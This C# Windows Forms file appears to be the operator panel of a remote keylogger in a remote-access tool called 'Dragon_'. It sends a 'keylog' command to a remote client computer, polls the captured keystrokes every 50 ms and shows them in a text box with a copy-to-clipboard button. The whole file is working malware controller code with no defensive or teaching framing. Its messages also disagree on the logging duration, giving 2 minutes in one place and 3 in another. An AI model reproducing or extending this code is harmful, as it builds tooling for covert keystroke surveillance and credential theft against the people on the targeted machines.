using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Linq.Expressions;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Dragon_.Program;

namespace Dragon_
{
    public partial class KLogger : Form
    {
        public KLogger()
        {
            InitializeComponent();

        }

        private void button2_Click(object sender, EventArgs e)
        {
            CopyToClipboardButton_Click(sender, e);
        }
        private void CopyToClipboardButton_Click(object sender, EventArgs e)
        {
            // Capture the text from the RichTextBox into a local variable on the UI thread
            string textToCopy = richTextBox1.Text;

            // Create a new thread for the clipboard operation
            Thread staThread = new Thread(
                delegate ()
                {
                    try
                    {
                        Clipboard.SetText(textToCopy);
                    }
                    catch (ExternalException ex)
                    {
                        // Handle cases where the clipboard might be in use by another process
                        MessageBox.Show($"Clipboard error: {ex.Message}");
                    }
                });

            // Set the thread's apartment state to STA
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join(); // Wait for the operation to complete
        }

        private void button3_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("The keylogger only loggs keys up to 2 minutes, if you want to log the keys after 2 minutes then press this button again please", "Info");
            Program.Log($"The Keylogger has started at the Clients Computer and will end in 3 minutes.");
            Program.hh.SendCommand("keylog", Program.AppState.CurrentUser);
            Program.AppState.keystroke_ = 0;
            Program.AppState.KeyStrokes = "";
            SetupKeyRefresh();
        }

        private int lastKeystroke = 0; // keep track of last known keystroke count

        private void SetupKeyRefresh()
        {
            try
            {
                var timer = new System.Windows.Forms.Timer();
                timer.Interval = 50; // check every 50ms
                bool c = true;
                timer.Tick += (s, e) =>
                {


                    int current = Program.AppState.keystroke_;

                    if (current > lastKeystroke)
                    {
                        if (richTextBox1 != null && !richTextBox1.IsDisposed)
                        {
                            richTextBox1.Text = Program.AppState.KeyStrokes;
                            richTextBox1.SelectionStart = richTextBox1.Text.Length;
                            richTextBox1.ScrollToCaret();

                            lastKeystroke = current; // mark as handled
                        }
                    }
                };
                timer.Start();
                
            }
            catch
            {
                //
            }
        }
    }
}
